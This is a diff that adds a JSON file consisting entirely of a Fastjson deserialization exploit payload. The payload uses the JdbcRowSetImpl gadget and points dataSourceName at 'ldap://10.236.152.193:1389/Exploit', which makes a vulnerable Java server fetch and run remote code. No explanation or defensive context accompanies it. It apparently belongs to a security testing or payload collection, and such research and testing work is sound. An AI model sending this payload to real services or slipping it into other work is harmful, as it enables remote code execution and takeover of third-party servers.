@@ -1,0 +1,11 @@
+{
+    "name": {
+        "@type": "java.lang.Class",
+        "val": "com.sun.rowset.JdbcRowSetImpl"
+    },
+    "age": {
+        "@type": "com.sun.rowset.JdbcRowSetImpl",
+        "dataSourceName": "ldap://10.236.152.193:1389/Exploit",
+        "autoCommit": true
+    }
+}
